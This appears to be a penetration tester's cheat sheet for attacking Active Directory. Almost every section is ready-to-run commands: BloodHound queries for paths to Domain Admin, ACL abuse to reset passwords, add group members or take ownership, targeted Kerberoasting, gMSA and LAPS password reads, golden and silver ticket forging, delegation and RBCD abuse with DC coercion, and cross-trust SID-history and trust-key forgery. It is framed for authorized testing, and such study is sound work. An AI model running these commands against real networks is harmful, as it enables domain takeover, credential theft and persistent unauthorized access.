# AD Attack Path Enumeration, Delegation Abuse & Cross-Trust Attacks

*Complements notes/ad-coercion-and-relay.md (coercion+relay chains) and notes/adcs-certipy-cheatsheet.md (ADCS/ESC abuse). For authorized AD pentesting only.*

---

## 1. BloodHound CE — Attack Path Enumeration

BloodHound CE (Docker/Postgres/Neo4j rewrite) ingests collector data and runs Cypher queries to find shortest paths to Domain Admin, Kerberoastable users, ADCS abuse edges, etc.

```bash
# Windows collector (SharpHound) — routinely flagged by EDR; consider the Linux ingestor instead
SharpHound.exe --CollectionMethods All --Domain domain.local
SharpHound.exe --CollectionMethods DCOnly --Domain domain.local     # stealthier, DC-only, no member-host traffic
SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 02:00:00   # session-based paths over time

# Linux ingestor (preferred on OSCP boxes without Windows access, generally stealthier)
bloodhound-python -c DCOnly -u user01 -p 'password' -d domain.local -ns <DC_IP> --zip
```
**Reference:** https://github.com/SpecterOps/BloodHound · https://github.com/dirkjanm/BloodHound.py

### Analysis — attack paths from collected data
After ingesting data in the BloodHound CE GUI, mark compromised principals as **Owned** (right-click → "Mark as Owned") so path queries can start from them, then use:
- **Built-in queries:** "Shortest Path to Domain Admins", "Shortest Paths from Owned Objects", "Shortest Paths to Unconstrained Delegation Systems", "Find Kerberoastable Users", "Find AS-REP Roastable Users".
- **Key abusable ACL edges to look for on the path:** `GenericAll`, `GenericWrite`, `WriteDacl`, `WriteOwner`, `Owns`, `ForceChangePassword`, `AddMember`, `AddSelf`, `ReadGMSAPassword`, `AllowedToDelegate`, `AllowedToAct` (RBCD), `DCSync` (needs both `GetChanges` + `GetChangesAll`).
- **Example Cypher** — shortest paths from any owned principal to Domain Admins:
```cypher
MATCH p=shortestPath((n {owned:true})-[r:MemberOf|GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|ForceChangePassword|AddMember|AllowedToDelegate|AllowedToAct*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}))
RETURN p
```

*Note: the query above uses legacy BloodHound (v4) syntax. BloodHound CE uses a different schema — node properties and edge names may differ. Verify against your installed version.*

**Additional useful queries (legacy BH syntax — adapt property names for CE):**
```cypher
-- Users who can DCSync
MATCH (n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name

-- Computers where Domain Users can RDP
MATCH (g:Group {name:'DOMAIN USERS@DOMAIN.LOCAL'})-[:CanRDP]->(c:Computer) RETURN c.name

-- Kerberoastable users with a path to DA
MATCH (u:User {hasspn:true}), p=shortestPath((u)-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN u.name, LENGTH(p) ORDER BY LENGTH(p)

-- Computers with LAPS enabled
MATCH (c:Computer) WHERE c.haslaps=true RETURN c.name

-- Sessions: find where Domain Admins are logged in
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN c.name, u.name
```

---

## ACL Abuse — Exploiting BloodHound Edges

Concrete exploitation for the ACL edges §1 lists. `attacker:pass` below is whatever principal holds the edge; `<DC_IP>` is the domain controller. Prefer `bloodyAD` on Linux attack boxes (single static binary-ish, no .NET); PowerView commands are the Windows-session equivalent.

### GenericAll / WriteOwner-then-GenericAll / ForceChangePassword on a user — reset password
**Explanation:** `GenericAll` and the `ForceChangePassword` extended right both let you reset the target's password outright without knowing the current one. Plain `GenericWrite` alone does **not** carry that extended right (it only grants attribute writes) — if the edge is `GenericWrite`, use the targeted-Kerberoasting technique below instead, or escalate it to `GenericAll` via the WriteOwner chain further down.
```bash
# Impacket / Samba — no PowerShell required
net rpc password "targetuser" 'NewPassword123!' -U 'domain.local'/'attacker'%'pass' -S <DC_IP>

# bloodyAD
bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass set password targetuser 'NewPassword123!'
```
```powershell
# PowerView (Windows session)
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force) -Verbose
```
**Reference:** https://www.thehacker.recipes/ad/movement/access-controls/abuse#genericall-forcechangepassword-on-user

### GenericWrite on a user — targeted Kerberoasting
**Explanation:** `GenericWrite` lets you write the `servicePrincipalName` attribute directly, making an otherwise non-Kerberoastable account artificially Kerberoastable — request its TGS, crack offline, then clean up the SPN to reduce footprint.
```bash
# 1. Add a fake SPN
bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass set object targetuser servicePrincipalName -v 'fake/kerberoast'
```
```powershell
# PowerView equivalent
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/kerberoast'}
```
```bash
# 2. Request and crack the ticket
impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile hashes.txt domain.local/attacker:pass
hashcat -m 13100 hashes.txt rockyou.txt

# 3. Remove the fake SPN afterward (cleanup / reduce detection surface)
bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass remove object targetuser servicePrincipalName -v 'fake/kerberoast'
```
**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#targeted-kerberoasting-genericwrite

### AddMember / AddSelf — add yourself to a privileged group
**Explanation:** rights to add members to a group (often nested up to Domain Admins) mean you don't need any password abuse at all — just add the compromised principal directly.
```bash
net rpc group addmem "Domain Admins" "attacker" -U 'domain.local'/'attacker'%'pass' -S <DC_IP>

bloodyAD --host <DC_IP> -d domain.local -u attacker -p pass add groupMember "Domain Admins" attacker
```
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'
```
**Reference:** https://www.thehacker.recipes/ad/movement/access-controls/abuse#addmember

### WriteOwner — take ownership, then grant yourself rights (full chain)
**Explanation:** `WriteOwner` alone doesn't grant control of the object — it lets you change the *owner* to yourself, and as owner you can then write a new DACL (implicit `WriteDacl`) granting yourself `GenericAll`. This is a two-step chain, not a direct primitive.
```bash
# 1. Take ownership of the target object
owneredit.py -action write -new-owner attacker -target targetuser domain.local/attacker:pass -dc-ip <DC_IP>

# 2. Now that you own it, write a new ACE granting yourself full control
dacledit.py -action write -rights FullControl -principal attacker -target targetuser domain.local/attacker:pass -dc-ip <DC_IP>

# 3. Abuse the new GenericAll — e.g. reset the password as shown above
```
```powershell
# PowerView equivalent
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity attacker -Rights All
```
**Reference:** https://github.com/fortra/impacket/blob/master/examples/owneredit.py · https://www.thehacker.recipes/ad/movement/access-controls/abuse#writeowner

### ReadGMSAPassword — extract a gMSA's usable password
**Explanation:** the `msDS-ManagedPassword` blob on a gMSA is decodable straight to an NT hash if you can read it — no cracking, immediately usable for pass-the-hash.
```bash
gMSADumper.py -u attacker -p pass -d domain.local -l ldap://<DC_IP>
# nxc native method:
nxc ldap <DC_IP> -u user -p pass --gmsa
```
**Reference:** https://github.com/micahvandeusen/gMSADumper

### ReadLAPSPassword — read the LAPS password
**Explanation:** legacy LAPS stores the plaintext local admin password in `ms-Mcs-AdmPwd` (readable LDAP attribute); LAPS v2 (Windows LAPS) stores an **encrypted** blob in `msLAPS-EncryptedPassword` (and `msLAPS-Password` if encryption is disabled) that needs client-side decryption.
```bash
# Automated, whole domain
nxc ldap <DC_IP> -u attacker -p pass -M laps

# Manual LDAP read — legacy LAPS
ldapsearch -x -H ldap://<DC_IP> -D "attacker@domain.local" -w pass -b "DC=domain,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
```
```powershell
# LAPSv2 (Windows LAPS) — msLAPS-EncryptedPassword requires the LAPS PowerShell module to decrypt, ldapsearch alone only returns ciphertext
Get-LapsADPassword -Identity targetcomputer -AsPlainText
```
**Reference:** https://www.thehacker.recipes/ad/movement/credentials/dumping/laps · https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword

**Windows LAPS v2 (encrypted passwords):**
Recent nxc versions (`-M laps`) handle v2 decryption natively. For manual reads:
```bash
bloodyAD --host <DC_IP> -d domain.local -u user -p pass get object 'COMPUTER$' --attr msLAPS-EncryptedPassword
```
For discovery of which groups can read LAPS:
```powershell
# LAPSToolkit.ps1
Find-LAPSDelegatedGroups
Get-LAPSComputers
```

---

## Standalone Golden & Silver Tickets

Single-domain ticket forging. For crossing a trust boundary (ExtraSIDs / trust-key forgery), see §3 below — this section is deliberately not duplicating that.

### Golden Ticket
**Explanation:** forge a TGT for any user (usually Administrator, or any arbitrary account) using the domain's `krbtgt` hash — grants domain-wide access as that user until the `krbtgt` password is rotated twice. Requires the krbtgt hash, obtained via DCSync — see notes/credentials-harvesting-post-exploitation.md's DCSync section for the actual dump commands (not repeated here).
```bash
# mimikatz (Windows, in-memory)
kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTHASH> /ptt

# Impacket ticketer.py (Linux)
ticketer.py -nthash <KRBTGT_NTHASH> -domain-sid <DOMAIN_SID> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc01.domain.local
```
**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden-ticket

### Silver Ticket
**Explanation:** forge a service ticket (TGS) directly using a **service account's own** NTLM/AES hash — no KDC contact at all (no AS-REQ, no TGS-REQ to the DC), so it's quieter than a golden ticket. Access is limited to whatever SPN you forge for.
```bash
ticketer.py -nthash <SERVICE_ACCT_NTHASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn cifs/target.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass domain.local/Administrator@target.domain.local
```
Commonly targeted SPNs and what they grant:
| SPN | Grants |
|---|---|
| `cifs/<host>` | SMB share access, remote file ops (`smbclient.py`); combine with `host` for `psexec.py` |
| `host/<host>` | Scheduled tasks (`atexec.py`), service control (`sc.exe`), some WMI paths |
| `http/<host>` | WinRM / PowerShell remoting (`evil-winrm -k`) |
| `ldap/<host>` | If forged against a **DC's own** machine account hash, effectively enables DCSync-style replication via `secretsdump.py -k` |

**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver-ticket

---

## 2. Kerberos Delegation Abuse

### Unconstrained delegation
Find via BloodHound/`findDelegation.py`. Capture TGTs of anyone authenticating to a compromised unconstrained-delegation host (e.g. via coercion of a DC against that host, then capture with Rubeus/mimikatz on Windows, or monitor via Impacket).
```bash
impacket-findDelegation -dc-ip <DC_IP> DOMAIN/USER:PASSWORD   # enumerate all delegation types (credentials go in the positional target, no -u/-p/-d flags)
```
**Faster (nxc):** `nxc ldap <dc_ip> -u USER -p PASSWORD --trusted-for-delegation` lists delegation-trusted accounts directly.

**Exploitation (compromised unconstrained-delegation host):**
```bash
# 1. Monitor for incoming TGTs on the compromised host
Rubeus.exe monitor /interval:5 /nowrap
# or from Linux:
krbrelayx.py --target dc01.domain.local

# 2. Coerce a DC to authenticate (PrinterBug / PetitPotam)
python3 printerbug.py domain.local/user:pass@dc01.domain.local compromised-host.domain.local
# or:
python3 PetitPotam.py compromised-host.domain.local dc01.domain.local

# 3. Rubeus captures the DC's TGT — extract and use it
Rubeus.exe ptt /ticket:<base64-ticket>
# Now you have the DC machine account's TGT — DCSync or PSExec to the DC
```

### Constrained delegation with protocol transition (S4U2Self + S4U2Proxy)
```bash
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svcaccount:password
```

### Constrained delegation WITHOUT protocol transition
Identify which case applies before choosing an approach:
- **Protocol transition (above)** — `svcaccount`'s `userAccountControl` has `TRUSTED_TO_AUTH_FOR_DELEGATION` set (BloodHound: delegation edge shows "with protocol transition"); `msDS-AllowedToDelegateTo` lists the allowed SPNs. S4U2Self works with just the service account's own credentials, so `-impersonate` succeeds outright.
- **Without protocol transition** — `msDS-AllowedToDelegateTo` is set but `TRUSTED_TO_AUTH_FOR_DELEGATION` is NOT. S4U2Self is unavailable for arbitrary impersonation; `getST.py -impersonate` will fail unless you already hold the victim's own TGT (S4U2Self via a real TGT still functions, then S4U2Proxy chains from it). In that case, obtain the victim's TGT first (`getTGT.py` with their creds/hash, or extract via mimikatz), then request the referral service ticket:
```bash
getTGT.py domain.local/victimuser:password
KRB5CCNAME=victimuser.ccache getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/svcaccount:password
```

### RBCD (Resource-Based Constrained Delegation)
```bash
# 1. Add a rogue computer (any authenticated user can add up to ms-DS-MachineAccountQuota, default 10)
impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP> domain.local/user:password

# 2. Grant RBCD rights on the target
rbcd.py -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write -dc-ip <DC_IP> domain.local/user:password

# 3. Request a service ticket impersonating a privileged user
getST.py -spn cifs/target.domain.local -impersonate Administrator -dc-ip <DC_IP> domain.local/ATTACKERPC$:'Passw0rd!'

# 4. Use the ticket
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass -target-ip <TARGET_IP> target.domain.local/Administrator@target.domain.local
```
**Reference:** https://www.thehacker.recipes/ad/movement/kerberos/delegations/ · https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-3/

---

## 3. Cross-Trust Attacks

### Trust enumeration (do this before attacking a trust)
**Explanation:** confirm trust direction, transitivity, and whether SID filtering/quarantine is active before picking ExtraSIDs vs. trust-key forgery — an outgoing-only or filtered trust rules out the ExtraSIDs path entirely.
```cmd
:: Native — from a domain-joined host / existing authenticated session
nltest /domain_trusts /all_trusts
```
```bash
# From a non-domain-joined attacker box: nltest itself has no -u/-p flags, so run it
# remotely through an Impacket exec that does the authentication
wmiexec.py domain.local/attacker:pass@<DC_IP> "nltest /domain_trusts /all_trusts"
```
```powershell
# PowerView
Get-DomainTrust
Get-DomainTrustMapping   # recursively walks all reachable trusts, not just the current domain's
```
```bash
# Impacket has no dedicated trust-listing script — LDAP query of trustedDomain objects
# is the Linux-native fallback (ldapsearch or windapsearch)
ldapsearch -x -H ldap://<DC_IP> -D "attacker@domain.local" -w pass -b "DC=domain,DC=local" "(objectClass=trustedDomain)"
windapsearch.py --dc-ip <DC_IP> -d domain.local -u attacker -p pass --custom "(objectClass=trustedDomain)"
```
**Reference:** https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/nltest · https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainTrust/ · https://github.com/ropnop/windapsearch

Two paths to cross a parent/child or forest trust boundary once you own a DC on one side.

### ExtraSIDs / Golden Ticket with SID History (intra-forest, SID filtering not enforced)
```bash
# Dump krbtgt hash of the child domain
secretsdump.py child.domain.local/Administrator:password@CHILD_DC_IP -just-dc-user krbtgt
# Faster (nxc): nxc smb CHILD_DC_IP -u Administrator -p password --ntds --user krbtgt   # pulls just the krbtgt hash via DRSUAPI

# Forge a TGT injecting the parent's Enterprise Admins SID
ticketer.py -nthash <krbtgt_NTHASH> -domain-sid <CHILD_DOMAIN_SID> -domain child.domain.local -extra-sid <PARENT_DOMAIN_SID>-519 Administrator

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass child.domain.local/Administrator@PARENT_DC_FQDN

# Automated end-to-end equivalent:
raiseChild.py -target-exec <PARENT_DC_IP> CHILDFQDN/user:password
```

### Trust key extraction + inter-realm TGT forgery (works even with SID filtering)
```
# Mimikatz — dump the trust account key (elevated on either DC, or via DCSync of the trust account)
lsadump::trust /patch
```
Then forge an inter-realm TGT with Impacket's `ticketer.py` using the extracted trust key, and request cross-realm TGS via `getST.py` against the trusting domain's DC.

**SID filtering caveat:** forest trusts enforce SID filtering by default (RID<1000 and foreign SIDs stripped), blocking the ExtraSIDs path across forests — trust-key forgery or SID-History on quarantine-disabled trusts is the fallback.

**Reference:** https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/ · https://adsecurity.org/?p=1588 · https://github.com/fortra/impacket/blob/master/examples/raiseChild.py

---

## Tools Reference

| Tool | URL |
|---|---|
| BloodHound CE | https://github.com/SpecterOps/BloodHound |
| BloodHound.py (Linux ingestor) | https://github.com/dirkjanm/BloodHound.py |
| Impacket (ticketer.py, getST.py, addcomputer.py, rbcd.py, findDelegation.py, raiseChild.py, owneredit.py, dacledit.py) | https://github.com/fortra/impacket |
| Rubeus (Windows) | https://github.com/GhostPack/Rubeus |
| Mimikatz | https://github.com/gentilkiwi/mimikatz |
| bloodyAD | https://github.com/CravateRouge/bloodyAD |
| gMSADumper | https://github.com/micahvandeusen/gMSADumper |
| NetExec (nxc) | https://github.com/Pennyw0rth/NetExec |
| windapsearch | https://github.com/ropnop/windapsearch |
| PowerView | https://github.com/PowerShellMafia/PowerSploit |
